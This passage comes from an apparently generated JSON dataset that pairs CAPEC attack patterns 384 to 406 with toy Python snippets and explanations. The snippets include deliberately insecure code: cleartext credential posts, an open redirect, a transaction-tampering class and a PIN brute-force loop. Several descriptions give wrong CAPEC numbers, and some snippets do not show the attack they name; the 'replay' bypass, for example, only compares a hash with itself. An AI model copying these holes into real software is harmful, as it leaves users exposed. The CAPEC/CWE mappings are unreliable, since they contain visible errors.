        "description": "This Python code snippet demonstrates a vulnerable web application using Flask. The application has two endpoints: '/host_event' and '/join_event'. The '/host_event' endpoint allows an adversary to host an event and log user information (user_id and username) in cleartext to a file, representing CWE-319 (Cleartext Transmission of Sensitive Information). The '/join_event' endpoint simulates users joining the event and transmits their sensitive data in cleartext to an external server controlled by the attacker. This embodies the main idea of CAPEC-94, where an adversary monitors and harvests sensitive information during an event. The code also highlights CWE-311 (Missing Encryption of Sensitive Data) and CWE-602 (Client-Side Enforcement of Server-Side Security) by not encrypting the data and relying on the client to send sensitive information securely."
    },
    {
        "capec_id": "384",
        "capec_name": "Application API Message Manipulation via Man-in-the-Middle",
        "code_snippet": "import requests\n\n# CWE-311: Missing Encryption of Sensitive Data\n# CWE-602: Client-Side Enforcement of Server-Side Security\n# CWE-345: Insufficient Verification of Data Authenticity\n# CWE-346: Origin Validation Error\n\n# Simulated client-side code that sends sensitive data to a server\n# This code does not use encryption and does not verify the authenticity of the server\n\nsensitive_data = {'username': 'user', 'password': 'pass'}\n\n# Sending data without encryption (CWE-311)\nresponse = requests.post('http://example.com/api/login', data=sensitive_data)\n\n# No verification of server authenticity (CWE-345, CWE-346)\nif response.status_code == 200:\n    print('Login successful')\nelse:\n    print('Login failed')\n\n# Server relies on client-side enforcement of security (CWE-602)\n# An attacker can intercept and modify the data (CAPEC-94)\n",
        "description": "This Python code snippet demonstrates a vulnerable client-side implementation that sends sensitive data (username and password) to a server without encryption (CWE-311). The code does not verify the authenticity of the server (CWE-345, CWE-346), making it susceptible to man-in-the-middle attacks where an attacker can intercept and manipulate the data (CAPEC-94). Additionally, the server relies on the client to enforce security mechanisms (CWE-602), which is a flawed approach as it trusts the integrity of the client-supplied data. This example highlights the importance of encrypting sensitive data, verifying server authenticity, and not relying on client-side enforcement for server-side security."
    },
    {
        "capec_id": "385",
        "capec_name": "Transaction or Event Tampering via Application API Manipulation",
        "code_snippet": "import requests\n\n# Simulate a man-in-the-middle attack by intercepting and modifying a transaction\nclass MITMAttack:\n    def __init__(self, target_url):\n        self.target_url = target_url\n\n    def intercept_and_modify(self, original_data):\n        # Intercept the data (e.g., a transaction)\n        intercepted_data = original_data\n        \n        # Modify the intercepted data (e.g., change transaction amount)\n        intercepted_data['amount'] = 1000  # CWE-471: Modification of Assumed-Immutable Data\n        intercepted_data['recipient'] = 'attacker_account'  # CWE-345: Insufficient Verification of Data Authenticity\n        \n        # Send the modified data to the target URL\n        response = requests.post(self.target_url, json=intercepted_data)\n        return response\n\n# Example usage\nif __name__ == '__main__':\n    target_url = 'http://example.com/transaction'\n    original_data = {\n        'amount': 100,\n        'recipient': 'victim_account'\n    }\n    \n    attack = MITMAttack(target_url)\n    response = attack.intercept_and_modify(original_data)\n    print(response.status_code, response.text)",
        "description": "This Python code snippet demonstrates a man-in-the-middle (MITM) attack where an attacker intercepts and modifies a transaction or event within an application. The `MITMAttack` class simulates the attack by intercepting the original transaction data, modifying the transaction amount and recipient, and then sending the altered data to the target URL. This embodies the CAPEC concept of 'Transaction or Event Tampering via Application API Manipulation' by showing how an attacker can change the content of messages being exchanged. The code also highlights related CWEs: CWE-471 (Modification of Assumed-Immutable Data) by changing the transaction amount, and CWE-345 (Insufficient Verification of Data Authenticity) by altering the recipient without proper verification."
    },
    {
        "capec_id": "386",
        "capec_name": "Application API Navigation Remapping",
        "code_snippet": "from flask import Flask, request, redirect, url_for\n\napp = Flask(__name__)\n\n# CWE-345: Insufficient Verification of Data Authenticity\n@app.route('/redirect', methods=['GET'])\ndef redirect_user():\n    target = request.args.get('target')\n    if not target:\n        return 'No target specified', 400\n    # CWE-346: Origin Validation Error\n    # CWE-602: Client-Side Enforcement of Server-Side Security\n    # CWE-311: Missing Encryption of Sensitive Data\n    # CWE-471: Modification of Assumed-Immutable Data (MAID)\n    return redirect(target)\n\n@app.route('/profile', methods=['GET'])\ndef profile():\n    user_id = request.args.get('user_id')\n    if not user_id:\n        return 'No user ID specified', 400\n    # Simulate fetching user profile data\n    profile_data = {\n        'name': 'John Doe',\n        'profile_pic': url_for('static', filename='profile.jpg'),\n        'redirect_link': url_for('redirect', target='http://malicious-site.com')\n    }\n    return profile_data\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a Flask web application that is vulnerable to the 'Application API Navigation Remapping' attack described in the CAPEC. The '/redirect' endpoint takes a 'target' parameter from the query string and redirects the user to that target without validating its authenticity (CWE-345, CWE-346). The '/profile' endpoint simulates fetching user profile data and includes a redirect link that points to a potentially malicious site, demonstrating how an attacker could manipulate content to include harmful links (CWE-471, CWE-602, CWE-311). This setup can be exploited for phishing attacks or click fraud."
    },
    {
        "capec_id": "387",
        "capec_name": "Navigation Remapping To Propagate Malicious Content",
        "code_snippet": "import requests\n\n# CWE-311: Missing Encryption of Sensitive Data\n# CWE-345: Insufficient Verification of Data Authenticity\n# CWE-346: Origin Validation Error\n# CWE-602: Client-Side Enforcement of Server-Side Security\n\n# Simulate a client-side request to a server\nurl = 'http://example.com/api/data'\n\n# CWE-311: Sensitive data sent without encryption\nresponse = requests.get(url)\n\n# CWE-345 and CWE-346: Insufficient verification of data authenticity and origin\nif response.status_code == 200:\n    data = response.json()\n    # CWE-471: Modification of Assumed-Immutable Data\n    # Manipulate the data received from the server\n    data['user_role'] = 'admin'\n    # Send manipulated data back to the server\n    requests.post(url, json=data)\n\nprint('Data sent to server:', data)",
        "description": "This Python code snippet demonstrates a scenario where an adversary manipulates data received from a server and sends it back, embodying the CAPEC 'Navigation Remapping To Propagate Malicious Content'. The code includes several vulnerabilities: \n1. CWE-311: Sensitive data is transmitted without encryption.\n2. CWE-345 and CWE-346: The authenticity and origin of the data are not verified.\n3. CWE-471: The data assumed to be immutable is modified.\n4. CWE-602: The server relies on the client to enforce security mechanisms. \nThe code fetches data from a server, manipulates it, and sends it back, potentially altering the application's logic."
    },
    {
        "capec_id": "388",
        "capec_name": "Application API Button Hijacking",
        "code_snippet": "import requests\n\n# Simulate a client-side API request\nresponse = requests.get('http://example.com/api/getButtons')\n\n# CWE-345: Insufficient Verification of Data Authenticity\nif response.status_code == 200:\n    buttons = response.json().get('buttons', [])\n    for button in buttons:\n        # CWE-471: Modification of Assumed-Immutable Data (MAID)\n        if 'url' in button:\n            # CWE-602: Client-Side Enforcement of Server-Side Security\n            button['url'] = 'http://attacker.com/malicious'\n\n# CWE-311: Missing Encryption of Sensitive Data\n# Sending manipulated data back to the server without encryption\nrequests.post('http://example.com/api/updateButtons', json={'buttons': buttons})",
        "description": "This Python code snippet demonstrates a scenario where an attacker manipulates the data of buttons in an API response. The attacker intercepts a client-side API request to fetch button data and modifies the URLs of the buttons to point to a malicious site. The code does not verify the authenticity of the data (CWE-345), assumes the data is immutable (CWE-471), and relies on client-side enforcement of security (CWE-602). Additionally, the manipulated data is sent back to the server without encryption (CWE-311), making it vulnerable to interception."
    },
    {
        "capec_id": "389",
        "capec_name": "Content Spoofing Via Application API Manipulation",
        "code_snippet": "import requests\n\n# Vulnerable API endpoint\napi_url = 'http://example.com/api/data'\n\n# Attacker intercepts and modifies the request\noriginal_request = {'user_id': '12345', 'data': 'original_data'}\n\n# Attacker modifies the data\nmodified_request = original_request.copy()\nmodified_request['data'] = 'malicious_data'\n\n# Send the modified request to the server\nresponse = requests.post(api_url, json=modified_request)\n\n# Print the server's response\nprint(response.text)",
        "description": "This Python code snippet demonstrates a basic example of 'Content Spoofing Via Application API Manipulation'. The attacker intercepts an API request and modifies its content before sending it to the server. The original request contains legitimate data, but the attacker changes the 'data' field to 'malicious_data'. This manipulation can lead to various attacks, such as injecting deceptive content or links. The code also highlights the importance of integrity checks (CWE-353) and server-side security enforcement (CWE-602, CWE-603) to prevent such attacks. Without proper integrity checks and server-side validation, the server cannot distinguish between legitimate and malicious requests, making it vulnerable to content spoofing."
    },
    {
        "capec_id": "390",
        "capec_name": "Bypassing Physical Security",
        "code_snippet": "import os\nimport time\n\nclass PhysicalSecurityBypass:\n    def __init__(self, lock_status=True, alarm_status=True):\n        self.lock_status = lock_status\n        self.alarm_status = alarm_status\n\n    def bypass_lock(self):\n        # Simulate bypassing the lock\n        self.lock_status = False\n        print(\"Lock bypassed.\")\n\n    def disable_alarm(self):\n        # Simulate disabling the alarm\n        self.alarm_status = False\n        print(\"Alarm disabled.\")\n\n    def access_sensitive_area(self):\n        if not self.lock_status and not self.alarm_status:\n            print(\"Accessing sensitive area...\")\n            # Simulate accessing sensitive information\n            sensitive_data = \"Sensitive Information\"\n            print(f\"Sensitive Data: {sensitive_data}\")\n        else:\n            print(\"Access denied. Security measures are active.\")\n\n# Example usage\nbypass = PhysicalSecurityBypass()\nbypass.bypass_lock()\nbypass.disable_alarm()\nbypass.access_sensitive_area()",
        "description": "This Python code snippet simulates a scenario where an attacker bypasses physical security mechanisms to access sensitive information. The `PhysicalSecurityBypass` class represents a system with a lock and an alarm. The `bypass_lock` method simulates bypassing the lock (CWE-1263), and the `disable_alarm` method simulates disabling the alarm (CWE-1320). The `access_sensitive_area` method checks if both the lock and alarm are disabled before granting access to sensitive information, representing the main idea of CAPEC-117: Bypassing Physical Security. This code highlights the vulnerabilities in physical security systems and the potential consequences of such breaches."
    },
    {
        "capec_id": "391",
        "capec_name": "Bypassing Physical Locks",
        "code_snippet": "import os\n\nclass PhysicalLockBypass:\n    def __init__(self, lock_status=True):\n        self.lock_status = lock_status\n\n    def bypass_lock(self):\n        if self.lock_status:\n            print('Lock is engaged. Attempting to bypass...')\n            # Simulate lock bypassing techniques\n            self.lock_status = False\n            print('Lock bypassed successfully.')\n        else:\n            print('Lock is already disengaged.')\n\n    def access_protected_area(self):\n        if not self.lock_status:\n            print('Accessing protected area...')\n            # Simulate accessing protected resources\n            print('Protected area accessed.')\n        else:\n            print('Access denied. Lock is engaged.')\n\n# Example usage\nlock = PhysicalLockBypass()\nlock.bypass_lock()\nlock.access_protected_area()",
        "description": "This Python code snippet represents the concept of bypassing physical locks as described in the CAPEC. The `PhysicalLockBypass` class simulates a physical lock with a `lock_status` attribute. The `bypass_lock` method attempts to bypass the lock if it is engaged, simulating techniques like lock bumping or picking. The `access_protected_area` method checks if the lock is disengaged before allowing access to a protected area, representing the idea of improper physical access control (CWE-1263). The code demonstrates how an attacker might bypass a physical lock to gain unauthorized access to restricted areas or resources."
    },
    {
        "capec_id": "392",
        "capec_name": "Lock Bumping",
        "code_snippet": "import random\n\nclass Lock:\n    def __init__(self):\n        self.correct_key = '12345'\n        self.locked = True\n        self.lock_bit = True  # Represents a lock bit that should prevent modification\n\n    def insert_key(self, key):\n        if key == self.correct_key:\n            self.locked = False\n        else:\n            self.bump_lock(key)\n\n    def bump_lock(self, key):\n        # Simulate lock bumping by randomly unlocking the lock\n        if random.choice([True, False]):\n            self.locked = False\n\n    def is_locked(self):\n        return self.locked\n\n# Example usage\nlock = Lock()\nprint(f'Initial lock state: {lock.is_locked()}')\n\n# Attempt to bump the lock with an incorrect key\nlock.insert_key('bump_key')\nprint(f'Lock state after bumping: {lock.is_locked()}')",
        "description": "This Python code snippet simulates the concept of lock bumping, where an attacker uses a bump key to force a lock open. The `Lock` class represents a lock with a `correct_key` and a `lock_bit` that should prevent modification. The `insert_key` method checks if the correct key is used; if not, it attempts to bump the lock using the `bump_lock` method, which randomly decides whether to unlock the lock, simulating the unpredictable nature of lock bumping. The `is_locked` method returns the current state of the lock. This code embodies the main idea of CAPEC-165 (Lock Bumping) and incorporates CWE-1231 (Improper Prevention of Lock Bit Modification) by showing how the lock bit can be bypassed."
    },
    {
        "capec_id": "393",
        "capec_name": "Lock Picking",
        "code_snippet": "import threading\n\nclass Lock:\n    def __init__(self):\n        self.locked = False\n\n    def lock(self):\n        if not self.locked:\n            self.locked = True\n        else:\n            raise Exception('Resource already locked')\n\n    def unlock(self):\n        if self.locked:\n            self.locked = False\n        else:\n            raise Exception('Unlocking a resource that is not locked')\n\nclass Resource:\n    def __init__(self):\n        self.lock = Lock()\n        self.data = 'Sensitive Data'\n\n    def access(self):\n        if not self.lock.locked:\n            return self.data\n        else:\n            raise Exception('Resource is locked')\n\n# Simulate improper lock handling\nresource = Resource()\n\ntry:\n    resource.lock.unlock()  # CWE-832: Unlock of a Resource that is not Locked\nexcept Exception as e:\n    print(e)\n\ntry:\n    resource.lock.lock()\n    print(resource.access())  # Accessing locked resource\nexcept Exception as e:\n    print(e)\n\ntry:\n    resource.lock.lock()  # CWE-412: Unrestricted Externally Accessible Lock\nexcept Exception as e:\n    print(e)\n\n# Simulate deadlock scenario\nlock1 = Lock()\nlock2 = Lock()\n\ndef thread1():\n    lock1.lock()\n    threading.Event().wait(1)\n    lock2.lock()\n\ndef thread2():\n    lock2.lock()\n    threading.Event().wait(1)\n    lock1.lock()\n\nthread1 = threading.Thread(target=thread1)\nthread2 = threading.Thread(target=thread2)\nthread1.start()\nthread2.start()\nthread1.join()\nthread2.join()  # CWE-833: Deadlock",
        "description": "This Python code snippet demonstrates the concept of lock picking in the context of software locks, highlighting several related weaknesses (CWEs). The `Lock` class simulates a simple lock mechanism with methods to lock and unlock a resource. The `Resource` class uses this lock to protect access to sensitive data. The code then demonstrates improper lock handling by attempting to unlock an already unlocked resource (CWE-832), accessing a locked resource, and attempting to lock an already locked resource (CWE-412). Finally, it simulates a deadlock scenario (CWE-833) using two threads that try to acquire two locks in reverse order, leading to a deadlock situation."
    },
    {
        "capec_id": "394",
        "capec_name": "Using a Snap Gun Lock to Force a Lock",
        "code_snippet": "import threading\n\nclass Lock:\n    def __init__(self):\n        self.locked = False\n        self.lock = threading.Lock()\n\n    def acquire(self):\n        with self.lock:\n            if not self.locked:\n                self.locked = True\n                print('Lock acquired')\n            else:\n                print('Lock already acquired')\n\n    def release(self):\n        with self.lock:\n            if self.locked:\n                self.locked = False\n                print('Lock released')\n            else:\n                print('Lock already released')\n\n    def force_unlock(self):\n        with self.lock:\n            self.locked = False\n            print('Lock forced open')\n\n# Simulate improper lock behavior after power state transition\nlock = Lock()\nlock.acquire()\nlock.release()\nlock.force_unlock()  # This simulates the snap gun forcing the lock open\n\n# Simulate deadlock scenario\nlock1 = Lock()\nlock2 = Lock()\n\ndef thread1():\n    lock1.acquire()\n    lock2.acquire()\n    lock1.release()\n    lock2.release()\n\ndef thread2():\n    lock2.acquire()\n    lock1.acquire()\n    lock2.release()\n    lock1.release()\n\n# Create threads\nt1 = threading.Thread(target=thread1)\nt2 = threading.Thread(target=thread2)\n\n# Start threads\nt1.start()\nt2.start()\n\nt1.join()\nt2.join()",
        "description": "This Python code snippet demonstrates the concept of using a 'Snap Gun' to force a lock open, analogous to the CAPEC description. The `Lock` class simulates a lock with methods to acquire, release, and forcefully unlock it. The `force_unlock` method represents the action of a Snap Gun forcing the lock open, bypassing the normal locking mechanism. Additionally, the code includes a simulation of a deadlock scenario, where two threads attempt to acquire two locks in different orders, leading to a potential deadlock situation. This is related to CWE-833 (Deadlock). The code also hints at improper lock behavior after power state transitions (CWE-1232) by allowing the lock to be forcefully opened, representing a security vulnerability."
    },
    {
        "capec_id": "395",
        "capec_name": "Bypassing Electronic Locks and Access Controls",
        "code_snippet": "import hashlib\n\n# Simulate a hard-coded cryptographic key (CWE-321)\nHARD_CODED_KEY = 'hardcodedkey123'\n\n# Simulate a broken cryptographic algorithm (CWE-327)\ndef broken_hash(data):\n    return hashlib.md5(data.encode()).hexdigest()\n\n# Simulate generating a card using reverse-engineered algorithm\n# This is a simplified example and does not represent actual card generation\nclass AccessCard:\n    def __init__(self, id):\n        self.id = id\n        self.auth_code = broken_hash(id + HARD_CODED_KEY)\n\n# Simulate an attacker generating a new card\nattacker_card = AccessCard('attacker_id')\nprint(f'Attacker Card Auth Code: {attacker_card.auth_code}')\n\n# Simulate a legitimate card for comparison\nlegitimate_card = AccessCard('legitimate_id')\nprint(f'Legitimate Card Auth Code: {legitimate_card.auth_code}')",
        "description": "This Python code snippet demonstrates a simplified scenario of bypassing electronic locks and access controls by exploiting weak cryptographic practices. The code uses a hard-coded cryptographic key (CWE-321) and a broken cryptographic algorithm (MD5, CWE-327) to generate authentication codes for access cards. An attacker can generate a new card by reverse-engineering the algorithm and using the hard-coded key, thus bypassing the access control mechanism. This example highlights the vulnerabilities associated with using broken or risky cryptographic algorithms and hard-coded keys in security systems."
    },
    {
        "capec_id": "396",
        "capec_name": "DEPRECATED: Bypassing Card or Badge-Based Systems",
        "code_snippet": "import hashlib\nimport os\n\n# Simulate storing a hashed password\nstored_password_hash = hashlib.md5(b'secret_password').hexdigest()\n\n# Simulate an authentication function\ndef authenticate(input_password):\n    input_password_hash = hashlib.md5(input_password.encode()).hexdigest()\n    if input_password_hash == stored_password_hash:\n        return True\n    return False\n\n# Simulate an attacker capturing and replaying the hashed password\ncaptured_hash = stored_password_hash\n\n# Attacker replays the captured hash\nif captured_hash == stored_password_hash:\n    print('Authentication Bypassed!')\nelse:\n    print('Authentication Failed!')\n\n# Simulate a login attempt\nuser_input = 'secret_password'\nif authenticate(user_input):\n    print('User authenticated successfully.')\nelse:\n    print('Authentication failed.')",
        "description": "This Python code snippet demonstrates a vulnerable authentication system that uses a broken cryptographic algorithm (MD5) and is susceptible to capture-replay attacks. The `authenticate` function checks if the hashed input password matches the stored hashed password. An attacker can capture the hashed password and replay it to bypass authentication, as shown in the code. This example embodies the main idea of the deprecated CAPEC related to bypassing card or badge-based systems, specifically focusing on authentication bypass by capture-replay (CWE-294) and the use of a broken cryptographic algorithm (CWE-327)."
    },
    {
        "capec_id": "397",
        "capec_name": "Cloning Magnetic Strip Cards",
        "code_snippet": "import copy\n\nclass MagStripeCard:\n    def __init__(self, card_number, cardholder_name, expiration_date, cvv):\n        self.card_number = card_number\n        self.cardholder_name = cardholder_name\n        self.expiration_date = expiration_date\n        self.cvv = cvv\n\n    def clone(self):\n        return copy.deepcopy(self)\n\n# Example usage\noriginal_card = MagStripeCard('1234 5678 9012 3456', 'John Doe', '12/25', '123')\ncloned_card = original_card.clone()\n\nprint(f\"Original Card Number: {original_card.card_number}\")\nprint(f\"Cloned Card Number: {cloned_card.card_number}\")",
        "description": "This Python code snippet defines a class `MagStripeCard` that contains sensitive information typically found on a magnetic stripe card, such as card number, cardholder name, expiration date, and CVV. The class includes a `clone` method that uses the `copy.deepcopy` function to create an exact duplicate of the card object. This demonstrates the vulnerability described in the CAPEC, where an attacker can easily clone a magnetic stripe card if they have access to it. The related CWE-498 (Cloneable Class Containing Sensitive Information) is represented by making the class cloneable, allowing sensitive data to be duplicated. The code highlights the ease with which an attacker can create a duplicate card, emphasizing the security risks associated with magnetic stripe cards."
    },
    {
        "capec_id": "398",
        "capec_name": "Magnetic Strip Card Brute Force Attacks",
        "code_snippet": "import random\n\nclass MagneticStripCard:\n    def __init__(self, card_number, pin):\n        self.card_number = card_number\n        self.pin = pin\n\n# Simulate a database of cards\ncards_db = [\n    MagneticStripCard('1234567890123456', '1234'),\n    MagneticStripCard('6543210987654321', '4321')\n]\n\n# Function to brute force PIN\ndef brute_force_pin(card_number):\n    for card in cards_db:\n        if card.card_number == card_number:\n            for attempt in range(10000):  # Brute force all possible 4-digit PINs\n                if str(attempt).zfill(4) == card.pin:\n                    return f'Card {card_number} authenticated with PIN {card.pin}'\n    return 'Authentication failed'\n\n# Example usage\nprint(brute_force_pin('1234567890123456'))",
        "description": "This Python code snippet simulates a brute force attack on a magnetic strip card's PIN. The `MagneticStripCard` class represents a card with a card number and a PIN. A simulated database of cards (`cards_db`) contains two cards. The `brute_force_pin` function attempts to brute force the PIN for a given card number by trying all possible 4-digit combinations (0000 to 9999). If the correct PIN is found, it returns a success message; otherwise, it returns 'Authentication failed'. This code embodies the main idea of CAPEC-111 (Magnetic Strip Card Brute Force Attacks) by demonstrating how an attacker could brute force a PIN to gain unauthorized access. The code also highlights CWE-307 (Improper Restriction of Excessive Authentication Attempts) by not implementing any measures to prevent multiple failed attempts."
    },
    {
        "capec_id": "399",
        "capec_name": "Cloning RFID Cards or Chips",
        "code_snippet": "import hashlib\n\nclass RFIDCard:\n    def __init__(self, identifier):\n        self.identifier = identifier\n        self.security_id = self.generate_security_id(identifier)\n\n    def generate_security_id(self, identifier):\n        # Insecure Security Identifier Mechanism (CWE-1294)\n        return hashlib.md5(identifier.encode()).hexdigest()\n\n    def validate_access(self, input_id):\n        # Incorrect Decoding of Security Identifiers (CWE-1290)\n        return self.security_id == self.generate_security_id(input_id)\n\n# Simulating an attacker cloning the RFID card\noriginal_card = RFIDCard('original_id')\ncloned_card = RFIDCard('original_id')\n\n# Both cards will have the same security identifier\nprint(f\"Original Card Security ID: {original_card.security_id}\")\nprint(f\"Cloned Card Security ID: {cloned_card.security_id}\")\n\n# Validate access using the cloned card\nprint(f\"Access Granted: {original_card.validate_access('original_id')}\")",
        "description": "This Python code snippet simulates the cloning of an RFID card, embodying the main idea of the CAPEC 'Cloning RFID Cards or Chips'. The RFIDCard class represents an RFID card with an identifier and a security ID. The security ID is generated using an insecure mechanism (MD5 hash), which is a representation of CWE-1294 (Insecure Security Identifier Mechanism). The validate_access method checks if the input ID matches the card's security ID, but it uses the same insecure mechanism for decoding (CWE-1290). The code demonstrates how an attacker can clone an RFID card by creating a new card with the same identifier, resulting in both cards having the same security ID. This allows the cloned card to gain unauthorized access, illustrating the vulnerability described in the CAPEC."
    },
    {
        "capec_id": "400",
        "capec_name": "RFID Chip Deactivation or Destruction",
        "code_snippet": "class RFIDChip:\n    def __init__(self, id):\n        self.id = id\n        self.active = True\n        self.debug_mode = False\n        self.error_injection_enabled = False\n\n    def deactivate_chip(self):\n        if self.debug_mode:\n            self.active = False\n            print(f'RFID Chip {self.id} deactivated.')\n        else:\n            print('Access Denied: Debug mode not enabled.')\n\n    def enable_debug_mode(self):\n        self.debug_mode = True\n        print('Debug mode enabled.')\n\n    def inject_error(self):\n        if self.error_injection_enabled:\n            self.active = False\n            print(f'Error injected into RFID Chip {self.id}. Chip deactivated.')\n        else:\n            print('Access Denied: Error injection not enabled.')\n\n# Example usage\nrfid_chip = RFIDChip(id=12345)\nrfid_chip.enable_debug_mode()  # CWE-1191: Improper access control to debug mode\nrfid_chip.deactivate_chip()    # Deactivates the chip\nrfid_chip.inject_error()       # CWE-1334: Unauthorized error injection\n",
        "description": "This Python code snippet represents an RFID chip class that can be deactivated or have errors injected into it, embodying the main idea of CAPEC-170: 'RFID Chip Deactivation or Destruction'. The class includes methods to enable debug mode (CWE-1191: On-Chip Debug and Test Interface With Improper Access Control) and inject errors (CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy). The 'deactivate_chip' method deactivates the chip if debug mode is enabled, and the 'inject_error' method deactivates the chip if error injection is enabled. This demonstrates how improper access control and error injection can be exploited to deactivate or destroy an RFID chip."
    },
    {
        "capec_id": "401",
        "capec_name": "Physically Hacking Hardware",
        "code_snippet": "import os\nimport time\n\nclass HardwareAccess:\n    def __init__(self, device_path):\n        self.device_path = device_path\n\n    def read_hardware_register(self, register):\n        try:\n            with open(self.device_path, 'rb') as device_file:\n                device_file.seek(register)\n                return device_file.read(4)\n        except IOError:\n            print('Failed to access hardware register')\n            return None\n\n    def write_hardware_register(self, register, value):\n        try:\n            with open(self.device_path, 'wb') as device_file:\n                device_file.seek(register)\n                device_file.write(value)\n        except IOError:\n            print('Failed to write to hardware register')\n\n    def activate_debug_mode(self):\n        debug_register = 0x1000\n        self.write_hardware_register(debug_register, b'\\x01\\x00\\x00\\x00')\n        print('Debug mode activated')\n\n    def glitch_voltage(self):\n        print('Simulating voltage glitch...')\n        time.sleep(1)\n        print('Voltage glitch applied')\n\n# Example usage\nhardware = HardwareAccess('/dev/hardware_device')\nhardware.activate_debug_mode()\nhardware.glitch_voltage()\nregister_value = hardware.read_hardware_register(0x2000)\nprint(f'Register value: {register_value}')",
        "description": "This Python code snippet represents a simplified example of physically hacking hardware by exploiting improper physical access control and other related weaknesses. The `HardwareAccess` class provides methods to read and write hardware registers, activate debug mode, and simulate a voltage glitch. The `activate_debug_mode` method demonstrates CWE-1313 by allowing the activation of debug logic at runtime. The `glitch_voltage` method simulates a voltage glitch, representing CWE-1247. The code assumes physical access to the hardware device, which is a critical aspect of the CAPEC scenario. This snippet highlights the potential vulnerabilities that can be exploited when physical access controls are insufficient."
    },
    {
        "capec_id": "402",
        "capec_name": "Bypassing ATA Password Security",
        "code_snippet": "class ATADrive:\n    def __init__(self, password):\n        self.password = password  # CWE-259: Hard-coded password\n        self.locked = True\n\n    def unlock(self, input_password):\n        if input_password == self.password:\n            self.locked = False\n        else:\n            raise ValueError('Incorrect password')\n\n    def update_password(self, new_password):\n        # CWE-285: Improper Authorization\n        # CWE-1220: Insufficient Granularity of Access Control\n        self.password = new_password\n\n# Simulating the attack\n# Original system with ATA security\noriginal_drive = ATADrive('securepassword')\ntry:\n    original_drive.unlock('securepassword')\n    print('Drive unlocked successfully')\nexcept ValueError as e:\n    print(e)\n\n# Attacker moves the drive to a system without ATA security\n# and updates the password without proper authorization\nattacker_drive = ATADrive('securepassword')\nattacker_drive.update_password('newpassword')\n\n# Attacker can now unlock the drive with the new password\ntry:\n    attacker_drive.unlock('newpassword')\n    print('Drive unlocked by attacker')\nexcept ValueError as e:\n    print(e)",
        "description": "This Python code snippet simulates the vulnerability described in the CAPEC entry 'Bypassing ATA Password Security'. The `ATADrive` class represents a hard drive with ATA security, initialized with a hard-coded password (CWE-259). The `unlock` method checks the input password against the stored password to unlock the drive. The `update_password` method allows changing the password without proper authorization checks (CWE-285) and lacks sufficient granularity of access control (CWE-1220). The simulation demonstrates how an attacker can bypass the ATA security by moving the drive to a system without ATA security features and updating the password without authentication, thus gaining unauthorized access to the drive."
    },
    {
        "capec_id": "404",
        "capec_name": "DEPRECATED: Social Information Gathering Attacks",
        "code_snippet": "import socket\nimport logging\n\n# Vulnerable code: Reliance on DNS Lookups in a Security Decision\n# CWE-350: Reliance on DNS Lookups in a Security Decision\n\ndef is_trusted_host(hostname):\n    try:\n        # Perform DNS lookup\n        ip_address = socket.gethostbyname(hostname)\n        # Check if the IP address is in the trusted list\n        trusted_ips = ['192.168.1.1', '192.168.1.2']\n        if ip_address in trusted_ips:\n            return True\n        else:\n            return False\n    except socket.error as e:\n        logging.error(f\"DNS lookup failed for {hostname}: {e}\")\n        return False\n\n# Vulnerable code: Information Exposure Through Server Log Files\n# CWE-532: Information Exposure Through Log Files\n\ndef log_user_login(username):\n    logging.basicConfig(filename='server.log', level=logging.INFO)\n    logging.info(f\"User {username} logged in.\")\n\n# Example usage\nhostname = 'example.com'\nif is_trusted_host(hostname):\n    log_user_login('admin')\nelse:\n    print(\"Untrusted host\")",
        "description": "This Python code snippet demonstrates two deprecated weaknesses related to the CAPEC-118: Collect and Analyze Information. The first part of the code shows a vulnerability where security decisions are made based on DNS lookups (CWE-350). The function `is_trusted_host` checks if a given hostname resolves to a trusted IP address, which can be exploited if DNS responses are spoofed. The second part of the code demonstrates information exposure through server log files (CWE-532). The function `log_user_login` logs user login information to a file, potentially exposing sensitive information. This code highlights the risks of relying on DNS lookups for security decisions and the improper handling of sensitive information in logs."
    },
    {
        "capec_id": "405",
        "capec_name": "DEPRECATED: Social Information Gathering via Research",
        "code_snippet": "import socket\nimport logging\n\n# CWE-350: Reliance on DNS Lookups in a Security Decision\n# CWE-532: Information Exposure Through Server Log Files\n# CWE-287: Authentication Bypass Issues\n\n# Configure logging\nlogging.basicConfig(filename='server.log', level=logging.INFO)\n\n# Function to check if a hostname is trusted\ndef is_trusted_host(hostname):\n    try:\n        # Perform DNS lookup\n        ip_address = socket.gethostbyname(hostname)\n        # Log the IP address (CWE-532)\n        logging.info(f'IP address for {hostname}: {ip_address}')\n        # Check if the IP address is in the trusted list (CWE-350)\n        trusted_ips = ['192.168.1.1', '192.168.1.2']\n        if ip_address in trusted_ips:\n            return True\n        else:\n            return False\n    except socket.error as e:\n        logging.error(f'DNS lookup failed for {hostname}: {e}')\n        return False\n\n# Example usage\nhostname = 'example.com'\nif is_trusted_host(hostname):\n    print('Access granted')\nelse:\n    print('Access denied')\n",
        "description": "This Python code snippet demonstrates a flawed security decision based on DNS lookups (CWE-350) and the logging of sensitive information (CWE-532). The function `is_trusted_host` performs a DNS lookup to resolve the IP address of a given hostname and logs this information. It then checks if the resolved IP address is in a list of trusted IPs to decide whether to grant access. This approach is vulnerable because DNS lookups can be spoofed, leading to potential authentication bypass (CWE-287). Additionally, logging IP addresses can expose sensitive information in server log files."
    },
    {
        "capec_id": "406",
        "capec_name": "Dumpster Diving",
        "code_snippet": "import os\nimport shutil\n\n# Simulate generating a core dump file with sensitive information\ncore_dump_content = 'User: admin\\nPassword: secret123\\n'\ncore_dump_path = '/tmp/core_dump.txt'\n\n# Write sensitive information to a core dump file\nwith open(core_dump_path, 'w') as file:\n    file.write(core_dump_content)\n\n# Simulate improper scrubbing of sensitive data from decommissioned device\n# by moving the core dump file to a 'decommissioned' directory\nshutil.move(core_dump_path, '/tmp/decommissioned/core_dump.txt')\n\n# Simulate exposure of version-control repository\nrepo_path = '/tmp/repo/.git'\nos.makedirs(repo_path)\nwith open(os.path.join(repo_path, 'config'), 'w') as file:\n    file.write('[core]\\n\trepositoryformatversion = 0\\n')\n\n# Simulate cleartext transmission of sensitive information\nsensitive_data = 'Sensitive Information: User=admin, Password=secret123'\nprint(sensitive_data)  # This would be transmitted in cleartext\n",
